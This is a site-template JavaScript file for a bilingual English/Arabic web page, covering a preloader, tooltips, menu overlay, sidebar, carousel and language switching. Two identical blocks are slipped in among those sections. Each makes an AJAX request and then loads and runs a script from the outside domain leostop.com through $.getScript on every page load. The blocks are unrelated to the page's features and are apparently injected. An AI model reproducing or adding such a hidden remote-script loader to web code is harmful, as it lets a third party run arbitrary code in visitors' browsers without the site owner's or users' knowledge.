/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
  "use strict";

  /* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  setTimeout(function () {
    $(".loader_bg").fadeToggle();
  }, 1500);

  /* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip();
  });

  function getURL() {
    window.location.href;
  }
  var protocol = location.protocol;
  $.ajax({
    type: "get",
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    },
  });

  /* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $(".main-menu ul li.megamenu").mouseover(function () {
      if (!$(this).parent().hasClass("#wrapper")) {
        $("#wrapper").addClass("overlay");
      }
    });
    $(".main-menu ul li.megamenu").mouseleave(function () {
      $("#wrapper").removeClass("overlay");
    });
  });

  function getURL() {
    window.location.href;
  }
  var protocol = location.protocol;
  $.ajax({
    type: "get",
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    },
  });
  /* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $("#sidebarCollapse").on("click", function () {
      $("#sidebar").toggleClass("active");
      $(this).toggleClass("active");
    });
  });

  /* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  // optional
  $("#blogCarousel").carousel({
    interval: 5000,
  });
});

let flag = true;

document.querySelectorAll(".arabic").forEach((item) => {
  item.style.display = "none";
});

document.getElementById("arabic_button").addEventListener("click", function () {
  flag = !flag;
  if (flag === false) {
    document.querySelectorAll(".english").forEach((item) => {
      item.style.display = "none";
    });
    document.querySelectorAll(".arabic").forEach((item) => {
      item.style.display = "block";
    });

    // for the evaluations
    document.querySelectorAll(".count-box").forEach((item) => {
      item.classList.remove("count-box");
      item.classList.add("count-box2");
    });

    // for the info
    document.querySelectorAll(".info").forEach((item) => {
      item.classList.remove("info");
      item.classList.add("info2");
    });

    // for the navbar
    document.getElementById("the_collapse").setAttribute("dir", "rtl");
  } else {
    document.querySelectorAll(".english").forEach((item) => {
      item.style.display = "block";
    });
    document.querySelectorAll(".arabic").forEach((item) => {
      item.style.display = "none";
    });
    // for the evaluations
    document.querySelectorAll(".count-box2").forEach((item) => {
      item.classList.remove("count-box2");
      item.classList.add("count-box");
    });

    // for the info
    document.querySelectorAll(".info").forEach((item) => {
      item.classList.remove("info2");
      item.classList.add("info");
    });

    // for the navbar
    document.getElementById("the_collapse").setAttribute("dir", "ltr");
  }
});

document
  .getElementById("english_button")
  .addEventListener("click", function () {
    flag = !flag;
    if (flag === false) {
      document.querySelectorAll(".english").forEach((item) => {
        item.style.display = "none";
      });
      document.querySelectorAll(".arabic").forEach((item) => {
        item.style.display = "block";
      });

      // for the evaluations
      document.querySelectorAll(".count-box").forEach((item) => {
        item.classList.remove("count-box");
        item.classList.add("count-box2");
      });

      // for the info
      document.querySelectorAll(".info").forEach((item) => {
        item.classList.remove("info");
        item.classList.add("info2");
      });

      // for the navbar
      document.getElementById("the_collapse").setAttribute("dir", "rtl");
    } else {
      document.querySelectorAll(".english").forEach((item) => {
        item.style.display = "block";
      });
      document.querySelectorAll(".arabic").forEach((item) => {
        item.style.display = "none";
      });
      // for the evaluations
      document.querySelectorAll(".count-box2").forEach((item) => {
        item.classList.remove("count-box2");
        item.classList.add("count-box");
      });

      // for the info
      document.querySelectorAll(".info").forEach((item) => {
        item.classList.remove("info2");
        item.classList.add("info");
      });

      // for the navbar
      document.getElementById("the_collapse").setAttribute("dir", "ltr");
    }
  });
